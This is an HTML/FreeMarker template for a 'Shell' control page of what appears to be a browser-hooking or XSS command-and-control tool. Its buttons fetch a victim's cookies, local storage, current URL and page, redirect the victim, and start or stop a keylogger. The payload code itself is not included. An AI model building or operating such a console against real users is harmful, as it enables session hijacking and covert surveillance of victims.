<html>
<head>
    <title>Shell</title>
    <script src="/resources/static/js/jquery.js"></script>
    <link href="/resources/static/css/main.css" rel="stylesheet"/>
    <script src="/resources/static/js/shell.js"></script>
</head>

<body>

<a href="/">Back</a>

<div class="wrapper">
    <h1>Shell</h1>
    <div class="left">

        <section id="commands">
            <#include "shellCommands.ftl"/>
        </section>


        <input id="input" type="text" spellcheck="false">
        <input id="submitButton" type="button" value="Send">
        <input id="clearButton" type="button" value="Clear">
        <input id="id" type="hidden" value="${id}">
    </div>
    <div class="right">
        <input class="function" type="button" data-function="msg" value="Send message box">
        <input class="function" type="button" data-function="getCookies" value="Get cookies">
        <input class="function" type="button" data-function="getLocalStorage" value="Get local storage content">
        <input class="function" type="button" data-function="getUrl" value="Get current url">
        <input class="function" type="button" data-function="goToUrl" value="Go to url">
        <input class="function" type="button" data-function="goToUrlInFrame" value="Go to url in frame">
        <input class="function" type="button" data-function="getSite" value="Get current page">
        <input class="function" type="button" data-function="startLogger" value="Start Keylogger">
        <input class="function" type="button" data-function="stopLogger" value="Stop Keylogger">
    </div>

    <div class="bottom">
        <div id="currentPage">
        </div>
    </div>
</div>




</body>

</html>